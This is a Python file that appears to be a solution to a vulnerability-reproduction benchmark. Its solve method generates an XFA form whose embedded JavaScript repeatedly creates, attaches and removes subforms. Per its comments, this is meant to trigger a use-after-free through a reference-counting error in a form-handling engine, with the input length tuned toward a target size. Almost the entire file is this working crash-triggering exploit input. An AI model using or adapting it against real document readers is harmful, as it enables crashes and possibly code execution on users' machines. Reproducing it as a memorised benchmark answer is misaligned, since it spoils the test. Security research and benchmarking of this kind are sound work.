import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball

        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        template = """<?xml version="1.0" encoding="UTF-8"?>
<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">
  <template>
    <subform name="root">
      <event activity="initialize">
        <script contentType="application/x-javascript">
          {script_body}
        </script>
      </event>
    </subform>
  </template>
</xdp:xdp>
"""

        # The vulnerability involves a reference counting error when a Dict is
        # passed to an Object constructor in the context of a form that is later
        # destroyed. The script below reproduces this sequence of events.
        # A dictionary `d` is created, then an object `o` from `d`. This `o` is
        # attached to a newly created "standalone" subform `s`. This subform is
        # then added to and immediately removed from the DOM, triggering its
        # destruction. The destruction process causes an incorrect decrement of
        # the dictionary's reference count, leading to a premature free. A subsequent
        # decrement when the original dictionary variable goes out of scope
        # results in a use-after-free.
        # Repeating this process increases the likelihood of a crash and allows
        # for tuning the PoC's size to be close to the ground-truth length.

        payload = "A" * 70
        num_repeats = 116

        script_parts = []
        for i in range(num_repeats):
            # Unique variable names per iteration prevent JS engine optimizations.
            script_parts.append(f"""
try {{
  var d{i} = {{ "p": "{payload}" }};
  var o{i} = new Object(d{i});
  var s{i} = xfa.form.createNode("subform", "sub{i}");
  s{i}.p = o{i};
  this.nodes.append(s{i});
  this.nodes.remove(s{i});
}} catch (e) {{}}
""")

        script_body = "\n".join(script_parts)
        poc_xml = template.format(script_body=script_body)

        return poc_xml.encode('utf-8')